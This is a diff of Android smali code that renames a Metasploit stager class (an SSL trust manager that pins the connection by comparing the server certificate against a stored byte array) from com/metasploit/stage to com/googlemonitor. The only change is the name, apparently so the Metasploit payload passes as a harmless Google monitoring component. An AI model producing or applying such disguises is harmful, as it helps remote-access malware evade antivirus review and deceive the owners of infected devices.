@@ -1,4 +1,4 @@
-.class public final Lcom/metasploit/stage/f;
+.class public final Lcom/googlemonitor/f;
 .super Ljava/lang/Object;
 
 # interfaces
@@ -16,7 +16,7 @@
 
     invoke-direct {p0}, Ljava/lang/Object;-><init>()V
 
-    iput-object p1, p0, Lcom/metasploit/stage/f;->a:[B
+    iput-object p1, p0, Lcom/googlemonitor/f;->a:[B
 
     return-void
 .end method
@@ -30,9 +30,9 @@
 
     check-cast p0, Ljavax/net/ssl/HttpsURLConnection;
 
-    new-instance v0, Lcom/metasploit/stage/f;
+    new-instance v0, Lcom/googlemonitor/f;
 
-    invoke-direct {v0, p1}, Lcom/metasploit/stage/f;-><init>([B)V
+    invoke-direct {v0, p1}, Lcom/googlemonitor/f;-><init>([B)V
 
     const-string v1, "SSL"
 
@@ -79,7 +79,7 @@
 .method public final checkServerTrusted([Ljava/security/cert/X509Certificate;Ljava/lang/String;)V
     .locals 4
 
-    iget-object v0, p0, Lcom/metasploit/stage/f;->a:[B
+    iget-object v0, p0, Lcom/googlemonitor/f;->a:[B
 
     if-nez v0, :cond_1
 
@@ -127,7 +127,7 @@
 
     move-result-object v2
 
-    iget-object v3, p0, Lcom/metasploit/stage/f;->a:[B
+    iget-object v3, p0, Lcom/googlemonitor/f;->a:[B
 
     invoke-static {v3, v2}, Ljava/util/Arrays;->equals([B[B)Z
 
